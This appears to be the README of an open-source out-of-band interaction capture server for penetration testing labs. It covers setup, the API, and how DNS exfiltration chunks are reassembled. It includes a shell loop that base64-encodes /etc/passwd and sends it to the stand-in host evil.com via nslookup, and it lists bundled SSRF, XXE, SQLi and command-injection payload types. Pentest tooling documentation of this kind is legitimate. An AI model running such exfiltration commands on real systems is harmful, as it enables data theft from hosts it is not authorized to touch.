<p align="center">
  <img src="docs/logo.svg" alt="Phantom Grid" width="120" />
</p>

<h1 align="center">⬡ Phantom Grid</h1>

<p align="center">
  <b>Free, open-source Burp Collaborator alternative for penetration testing labs</b><br/>
  <sub>Out-of-Band (OOB) interaction capture · HTTP/HTTPS · DNS · SQLite · Exfil reassembly</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0-00ffaa?style=flat-square" />
  <img src="https://img.shields.io/badge/python-3.10+-00ffaa?style=flat-square&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/license-MIT-00ccff?style=flat-square" />
  <img src="https://img.shields.io/badge/docker-ready-blue?style=flat-square&logo=docker&logoColor=white" />
</p>

---

## What is this?

**Phantom Grid** is a self-hosted OOB (Out-of-Band) interaction capture tool — a free alternative to Burp Collaborator for solving penetration testing labs (PortSwigger Web Security Academy, HackTheBox, TryHackMe, etc.).

### v2.0 Features

| Feature | Description |
|---------|-------------|
| **HTTP + HTTPS Capture** | Dual-stack with auto-generated self-signed TLS certs |
| **DNS Capture** | Built-in DNS server on port 53 |
| **DNS Exfil Reassembly** | Automatic chunk reassembly from multi-part DNS exfiltration |
| **SQLite Persistence** | All data survives server restarts (WAL mode for performance) |
| **40+ Payload Templates** | SSRF, XXE, SQLi OOB, CMDi, SSTI, DNS exfil — ready to copy |
| **Tactical Dashboard** | Command center UI with real-time monitoring |
| **Docker Ready** | One-command deployment |
| **REST API** | Full token/interaction/exfil management API |

---

## Quick Start

### Option 1: Python

```bash
git clone https://github.com/YOUR_USERNAME/phantom-grid.git
cd phantom-grid
pip install -r server/requirements.txt

# HTTP only
python server/server.py

# HTTP + HTTPS (auto-generates self-signed cert)
python server/server.py --https

# Full stack (requires sudo for DNS port 53)
sudo python server/server.py --https --dns
```

### Option 2: Docker

```bash
git clone https://github.com/YOUR_USERNAME/phantom-grid.git
cd phantom-grid
docker compose up -d
```

### Option 3: ngrok (for labs without a VPS)

```bash
python server/server.py --https &
ngrok http 9090
# Use the ngrok HTTPS URL in your payloads
```

---

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                      PHANTOM GRID v2.0                        │
│                                                               │
│  ┌─────────────┐      ┌─────────────────────────────────┐   │
│  │  Dashboard   │─API─▶│  Flask Server                   │   │
│  │  (React)     │      │                                 │   │
│  └─────────────┘      │  :9090  HTTP  capture + API     │   │
│                         │  :9443  HTTPS capture + API     │   │
│  ┌─────────────┐      │  :53    DNS   capture            │   │
│  │ Target App   │─────▶│                                 │   │
│  └─────────────┘      └──────────┬──────────────────────┘   │
│                                    │                          │
│                         ┌──────────▼──────────┐              │
│                         │   SQLite Database    │              │
│                         │   phantom_grid.db    │              │
│                         │                      │              │
│                         │  tokens              │              │
│                         │  interactions         │              │
│                         │  dns_exfil_sessions  │              │
│                         │  dns_exfil_chunks    │              │
│                         └─────────────────────┘              │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## HTTPS Support

Modern apps often block mixed-content requests (`http://` from `https://` pages). Phantom Grid v2.0 runs HTTPS alongside HTTP.

### Auto-generated self-signed cert

```bash
python server/server.py --https
# Generates certs/server.pem + certs/server.key automatically
# HTTPS available at https://0.0.0.0:9443
```

### Custom certificate (Let's Encrypt, etc.)

```bash
python server/server.py --https \
  --cert /etc/letsencrypt/live/yourdomain/fullchain.pem \
  --key /etc/letsencrypt/live/yourdomain/privkey.pem
```

### With ngrok (instant public HTTPS)

```bash
python server/server.py &
ngrok http 9090
# ngrok provides a trusted HTTPS URL automatically
```

---

## DNS Exfiltration Reassembly

Phantom Grid automatically reassembles chunked DNS exfiltration data. This is critical for extracting large payloads that must be split across multiple DNS lookups (labels limited to 63 bytes).

### Supported Formats

| Format | Example | Use Case |
|--------|---------|----------|
| **Simple** | `data.TOKEN.domain` | Single value exfil |
| **Indexed** | `0.chunk1.TOKEN.domain` | Auto-session, ordered chunks |
| **Tagged** | `sess1.0.chunk1.TOKEN.domain` | Named session with ordering |
| **End signal** | `end.sess1.TOKEN.domain` | Mark session complete |

### Example: Exfiltrate `/etc/passwd` via DNS

On the target:
```bash
# Split file into 50-byte base64 chunks and send via DNS
data=$(base64 /etc/passwd | tr -d '\n')
token="a1b2c3d4e5f6"
domain="evil.com"
i=0
while [ -n "$data" ]; do
  chunk=$(echo "$data" | cut -c1-50)
  data=$(echo "$data" | cut -c51-)
  nslookup "exfil.$i.$chunk.$token.$domain" >/dev/null 2>&1
  i=$((i+1))
done
nslookup "end.exfil.$token.$domain" >/dev/null 2>&1
```

View reassembled data:
```bash
curl http://localhost:9090/api/tokens/a1b2c3d4e5f6/exfil
```

Response:
```json
[{
  "session_tag": "exfil",
  "completed": 1,
  "chunk_count": 12,
  "reassembled": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYm..."
}]
```

---

## SQLite Persistence

All data is stored in `phantom_grid.db` using SQLite WAL mode for concurrent read/write performance.

```
phantom_grid.db
├── tokens                 — Token metadata
├── interactions            — All HTTP/DNS captures
├── dns_exfil_sessions     — Grouped exfil sessions
└── dns_exfil_chunks       — Individual exfil data chunks
```

Data survives server restarts. Back up by copying `phantom_grid.db`.

---

## API Reference

### Tokens

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/tokens` | List all tokens with stats |
| `POST` | `/api/tokens` | Create token `{"label": "...", "notes": "..."}` |
| `PATCH` | `/api/tokens/<id>` | Update token label/notes |
| `DELETE` | `/api/tokens/<id>` | Delete token + all data (CASCADE) |

### Interactions

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/tokens/<id>/interactions?limit=&offset=` | Get token interactions |
| `DELETE` | `/api/tokens/<id>/interactions` | Clear interactions |
| `GET` | `/api/log?limit=` | Global log (all tokens) |
| `GET` | `/api/poll?since=<ISO>` | Poll new interactions |

### DNS Exfiltration

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/tokens/<id>/exfil` | Get exfil sessions with reassembled data |

### System

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/stats` | Global stats (counts, DB size) |
| `GET` | `/health` | Health check |

### Capture Endpoints

| Protocol | Endpoint |
|----------|----------|
| HTTP | `http://server:9090/c/<TOKEN>` |
| HTTPS | `https://server:9443/c/<TOKEN>` |
| DNS | `<TOKEN>.yourdomain.com` |
| DNS exfil | `<data>.<TOKEN>.yourdomain.com` |

---

## CLI Options

```
python server.py [OPTIONS]

  --port N          HTTP port (default: 9090)
  --https           Enable HTTPS server
  --https-port N    HTTPS port (default: 9443)
  --cert PATH       Custom TLS certificate (PEM)
  --key PATH        Custom TLS key file
  --dns             Enable DNS capture server
  --dns-port N      DNS port (default: 53)
  --dns-ip IP       IP returned in DNS responses (default: 127.0.0.1)
  --db PATH         SQLite database path (default: phantom_grid.db)
```

---

## Comparison with Alternatives

| Feature | Burp Collaborator | Interactsh | Phantom Grid |
|---------|-------------------|------------|--------------|
| Price | Burp Pro ($$$) | Free | Free |
| HTTP/HTTPS | ✅ | ✅ | ✅ |
| DNS capture | ✅ | ✅ | ✅ |
| DNS exfil reassembly | ❌ | ❌ | ✅ |
| SMTP capture | ✅ | ✅ | ❌ (roadmap) |
| Self-hosted | ❌ | ✅ | ✅ |
| Custom domain | ❌ | ✅ | ✅ |
| Persistent storage | N/A | ❌ | ✅ (SQLite) |
| Dashboard UI | Burp Suite | CLI | Web UI |
| Payload templates | ❌ | ❌ | ✅ (40+) |

---

## Payload Categories

The dashboard includes 40+ ready-to-copy payloads:

- **HTTP Callback** — GET, cURL, wget, PowerShell, Python
- **SSRF** — direct, URL-encoded, double-encoded, gopher, IMDS redirect
- **XXE** — external entity, parameter entity, OOB DTD exfiltration
- **SQL Injection OOB** — Oracle UTL_HTTP, MSSQL xp_dirtree/xp_cmdshell, MySQL LOAD_FILE, PostgreSQL COPY
- **Command Injection** — backtick, $(), pipe, semicolon, newline, DNS exfil
- **DNS Lookup** — subdomain, nslookup, dig, data exfil
- **SSTI** — Jinja2, ERB, Freemarker, Twig
- **Email/SMTP** — header injection, IMAP callback

---

## Disclaimer

**For authorized penetration testing, security research, and educational lab environments only.** Always obtain proper authorization before testing systems you do not own. The authors are not responsible for misuse.

---

## Contributing

PRs welcome! Roadmap:

- [ ] SMTP/email callback capture
- [ ] Let's Encrypt auto-cert (ACME)
- [ ] WebSocket real-time push (replace polling)
- [ ] FTP callback capture
- [ ] Webhook notifications (Slack, Discord, Telegram)
- [ ] Multi-user auth
- [ ] Export to CSV/JSON
- [ ] LDAP callback capture

---

## License

MIT — see [LICENSE](LICENSE)
